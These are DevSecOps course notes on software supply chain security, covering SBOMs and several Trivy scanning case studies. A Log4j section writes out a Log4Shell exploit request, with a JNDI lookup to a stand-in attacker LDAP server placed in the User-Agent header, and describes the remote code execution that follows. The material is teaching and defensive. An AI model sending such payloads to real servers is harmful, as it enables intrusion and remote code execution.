# DevSecOps Course Notes

## Supply Chain Security

### Overview
Supply chain security encompasses:
- Open source components
- CI/CD pipelines
- Container ecosystems
- All dependencies and transitive dependencies

### Why Supply Chain Security Matters

**Evolution of Software Complexity:**
- Legacy approach: Build application + add few libraries
- Modern reality: Applications consist of thousands of components with exponentially growing dependency chains
- Security validation becomes increasingly complex at scale

**Attacker Perspective:**
- Supply chain attacks are highly attractive to attackers
- Single malicious update can compromise thousands of systems simultaneously
- Current lack of layer-by-layer validation creates opportunities
- Major challenge for organizations: Malicious code doesn't run on direct target but gets pulled as update by thousands of projects

### Code Visibility Reality

```
Your Direct Code:        20%
Dependencies:            80%
```

Components:
- Hidden dependency chains
- Transitive dependencies (dependencies of dependencies)
- Primary attacker focus area

### Hidden Dependencies Problem

**Key Issues:**
- Incomplete knowledge of what we actually use
- Transitive dependencies remain invisible
- Container images include more components than expected
- Manual tracking fails at scale

### Attack Surface Expansion

**Growth Factors:**
- More components than initially expected
- Direct + transitive dependencies multiply exposure
- Multiple versions of same component across systems
- Each layer adds potential vulnerability points

---

## SBOM (Software Bill of Materials)

### Definition
SBOM is a comprehensive inventory of what software contains:
- Libraries
- Dependencies and their versions
- Open source components
- Third-party components
- Base image components

**Core Principle:** No visibility = No security

### SBOM Capabilities

**Defensive Benefits:**
1. Complete inventory of components in use
2. Rapid identification of affected components when vulnerabilities emerge
3. Risk prioritization based on actual usage
4. Faster incident response times

### SBOM Implementation

**Usage Pattern:**
- Generate dependency graph
- Map all direct and transitive dependencies
- Track component versions
- Enable automated querying

**Standard Format:** CycloneDX

### Vulnerability Response Workflow

**When CVE is Published:**
1. CVE published to databases
2. SBOM scan executed
3. Affected applications/images identified
4. Patches/updates applied
5. Redeploy/release cycle triggered

**Result:** Visibility + Fast Response = Risk Mitigation

---

## Attack Methodology: Log4j Case Study

### Attack Chain

**Step 1: Reconnaissance**
- Attacker performs internet-wide sweep
- Identifies servers with exposed Log4j vulnerable versions
- Targets publicly accessible endpoints

**Step 2: Exploit Delivery**
```
GET /test HTTP/1.1
Host: victim.xa
User-Agent: ${jndi:ldap://attackerserver/}
```
- Malicious HTTP request sent to vulnerable server
- Payload embedded in User-Agent header (or any logged field)

**Step 3: Exploitation Trigger**
- Victim server logs request using Log4j
- Log4j processes the string and performs interpolation
- JNDI lookup executed: `${jndi:ldap://attackerserver/}`

**Step 4: Remote Code Execution**
- Log4j queries attacker-controlled LDAP server
- LDAP server responds with malicious Java class
- Victim server downloads malicious payload
- Payload executes on victim system

**Step 5: Post-Exploitation**
Attacker objectives may include:
- Cryptomining deployment
- Remote shell establishment
- Ransomware installation
- APT (Advanced Persistent Threat) foothold

---

## Defense Methodology: Log4j Remediation

### Response Workflow

**1. Vulnerability Disclosure**
- New CVE published
- Security teams alerted

**2. Impact Assessment**
```
Automated Query: "Which projects use log4j-core v2.14?"
```
- SBOM scanning across all systems
- Identify affected applications/services
- Prioritize based on exposure and criticality

**3. Remediation Steps**
- Update vulnerable components
- Rebuild affected applications
- Redeploy to production environments

**4. Continuous Operations**
- Automate vulnerability scanning
- Monitor for new disclosures
- Continuous SBOM updates

---

## DevSecOps Integration Points

### Pipeline Stages

**1. Development**
- Developer writes code
- Dependencies declared

**2. Source Control Management (SCM)**
- Code committed to repository
- Initial security checks possible

**3. CI/CD (Build Phase)**
- Dependency resolution
- SBOM generation
- Vulnerability scanning

**4. Distribution (Package Phase)**
- Artifact creation
- Dependency validation
- Package security verification

**5. Deployment & Use**
- Runtime monitoring
- Continuous security validation
- Incident response readiness

---

## Trivy: Vulnerability Scanner

### What is Trivy?
Comprehensive security scanner detecting vulnerabilities in:
- Container images
- Filesystems and source code
- Infrastructure as Code (Terraform, Kubernetes, Dockerfile)
- Git repositories
- SBOM files

---

### Case Study 1: Developer Pre-Commit Secret Leak Prevention

**Scenario:**
Developer accidentally commits AWS credentials in config file before pushing to repository.

**Detection:**
```bash
trivy fs --security-checks secret .
```

**Result Found:**
```
config/aws.yaml (secrets)
========================
CRITICAL: AWS Access Key ID
Line: 12
Match: AKIAIOSFODNN7EXAMPLE
```

**Response:**
1. Remove sensitive data from file
2. Revoke exposed credentials immediately
3. Add to .gitignore
4. Use environment variables or secret managers instead

**Prevention:**
Integrate into git pre-commit hook to scan before every commit.

---

### Case Study 2: Vulnerable Base Image in Production

**Scenario:**
Company uses nginx:1.19 as base image. New CVE-2021-23017 discovered affecting this version.

**Investigation:**
```bash
trivy image nginx:1.19
```

**Findings:**
```
nginx:1.19 (alpine 3.13.2)
==========================
CRITICAL: CVE-2021-23017
Package: nginx 1.19.0
Fixed Version: 1.19.6
Severity: CRITICAL
Description: DNS resolver off-by-one heap write leading to RCE
```

**Impact Assessment:**
- 47 microservices using this base image
- All internet-facing services affected
- Remote code execution possible

**Remediation:**
```bash
# Update Dockerfile
FROM nginx:1.19  →  FROM nginx:1.21

# Rebuild all affected images
docker build -t myapp:v2.0 .

# Scan new image
trivy image --severity CRITICAL myapp:v2.0
```

**Outcome:**
No critical vulnerabilities found in new version. Deploy to production.

---

### Case Study 3: CI/CD Pipeline Security Gate

**Scenario:**
Development team pushes new code. CI/CD must validate security before deployment.

**Pipeline Integration (GitLab CI):**
```yaml
security_scan:
  stage: test
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity HIGH,CRITICAL $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  allow_failure: false
```

**Event:**
Pipeline detects HIGH severity vulnerability in newly added dependency.

**Result:**
```
library: lodash 4.17.15
CVE-2020-8203
Severity: HIGH
Fixed Version: 4.17.21
```

**Pipeline Action:**
- Build fails automatically
- Deployment blocked
- Developer notified
- Must update lodash version to proceed

**Fix Applied:**
```bash
# Update package.json
"lodash": "^4.17.21"

# Rebuild and rescan
trivy image --severity HIGH,CRITICAL myapp:new-build
```

**Result:**
Pipeline passes. Code deployed safely.

---

### Case Study 4: Infrastructure Misconfiguration Detection

**Scenario:**
DevOps team writes Kubernetes deployment manifest with security risks.

**Kubernetes Manifest (deployment.yaml):**
```yaml
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
        securityContext:
          privileged: true
          runAsUser: 0
```

**Scan:**
```bash
trivy config deployment.yaml
```

**Findings:**
```
deployment.yaml (kubernetes)
============================
HIGH: Container running as root (runAsUser: 0)
HIGH: Privileged container enabled
MEDIUM: No resource limits defined
MEDIUM: Image using 'latest' tag
```

**Risk Explanation:**
- Root access = full container escape potential
- Privileged mode = host system access
- No resource limits = DoS risk
- Latest tag = version ambiguity

**Remediation:**
```yaml
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:v1.2.3
        securityContext:
          privileged: false
          runAsUser: 1000
          runAsNonRoot: true
        resources:
          limits:
            memory: "512Mi"
            cpu: "500m"
```

**Re-scan:**
```bash
trivy config deployment.yaml
```

**Result:**
All critical and high issues resolved.

---

### Case Study 5: Supply Chain Attack via Compromised Dependency

**Scenario:**
NPM package "event-stream" compromised with malicious code. Attacker injects cryptocurrency wallet stealer.

**Initial Scan:**
```bash
trivy fs --security-checks vuln,secret package-lock.json
```

**Detection:**
```
package-lock.json
=================
CRITICAL: Malicious package detected
Package: event-stream 3.3.6
Issue: Known malware injection
Compromised versions: 3.3.6
Safe version: 3.3.4 or 4.0.1
```

**Attack Vector:**
1. Attacker gains access to maintainer account
2. Publishes version 3.3.6 with malicious code
3. Code exfiltrates cryptocurrency wallet data
4. Thousands of projects auto-update and pull malicious version

**Company Impact:**
- 12 internal projects using event-stream
- Potential data exfiltration in production

**Response Protocol:**
```bash
# 1. Identify all affected projects
trivy fs --format json --output affected.json .

# 2. Immediately downgrade to safe version
npm install event-stream@3.3.4

# 3. Rebuild all applications
docker build -t myapp:patched .

# 4. Verify fix
trivy image myapp:patched

# 5. Emergency deployment
kubectl rollout restart deployment/myapp
```

**Prevention Measures:**
- Lock dependency versions in package-lock.json
- Regular SBOM generation and monitoring
- Automated vulnerability scanning in CI/CD
- Dependency update review process

---

### Case Study 6: Zero-Day Response Workflow

**Scenario:**
0-day vulnerability CVE-2024-XXXXX announced in OpenSSL 3.0.7. No patch available yet.

**Immediate Assessment:**
```bash
# Scan all production images
trivy image --format json --output assessment.json production-registry/*
```

**Finding:**
23 services running OpenSSL 3.0.7 - all vulnerable.

**Response Options:**

**Option 1: Downgrade (if safe version exists)**
```dockerfile
# Check available versions
trivy image alpine:3.16
trivy image alpine:3.15

# Use version with OpenSSL 3.0.5
FROM alpine:3.15
```

**Option 2: Apply Workaround**
- Disable vulnerable functionality
- Add WAF rules to block exploitation attempts
- Network segmentation to limit exposure

**Option 3: Wait for Patch**
```bash
# Monitor for updates
trivy image --download-db-only  # Updates vulnerability database

# Automated checking
while true; do
  trivy image myapp:latest | grep CVE-2024-XXXXX
  sleep 3600
done
```

**When Patch Released:**
1. Update base image
2. Rebuild all affected containers
3. Scan to verify fix
4. Rolling deployment to production
5. Post-mortem analysis

---

### Case Study 7: SBOM-Driven Incident Response

**Scenario:**
Log4Shell-like vulnerability announced. Need to identify all affected systems within 1 hour.

**Preparation (Before Incident):**
```bash
# Generate SBOMs for all images
trivy image --format cyclonedx --output nginx-sbom.json nginx:latest
trivy image --format cyclonedx --output app1-sbom.json app1:v1.0
trivy image --format cyclonedx --output app2-sbom.json app2:v2.1
```

**When Vulnerability Announced:**
```bash
# Scan all SBOMs for affected package
trivy sbom nginx-sbom.json --severity CRITICAL
trivy sbom app1-sbom.json --severity CRITICAL
trivy sbom app2-sbom.json --severity CRITICAL
```

**Automated Query:**
```bash
# Search for specific package across all SBOMs
for sbom in *.json; do
  echo "Checking $sbom"
  trivy sbom $sbom | grep "log4j-core"
done
```

**Result:**
- 8 out of 50 services affected
- Exact versions identified
- Deployment dates known
- Patch priority established

**Response Time:**
- Without SBOM: 6-12 hours manual investigation
- With SBOM: 15 minutes automated identification

**Business Impact:**
Reduced exposure window from hours to minutes.

---

### Trivy Essential Commands Reference

**Quick Scans:**
```bash
trivy image nginx:latest                    # Scan Docker image
trivy fs .                                   # Scan current directory
trivy config .                               # Scan IaC configurations
```

**Severity Filtering:**
```bash
trivy image --severity CRITICAL,HIGH nginx:latest
trivy image --ignore-unfixed nginx:latest    # Only fixable vulns
```

**CI/CD Usage:**
```bash
trivy image --exit-code 1 --severity CRITICAL myapp:${VERSION}
```

**SBOM Operations:**
```bash
trivy image --format cyclonedx --output sbom.json nginx:latest
trivy sbom sbom.json
```

**Secret Detection:**
```bash
trivy fs --security-checks secret .
```

**Output Formats:**
```bash
trivy image --format json --output results.json nginx:latest
trivy image --format sarif --output results.sarif nginx:latest
```




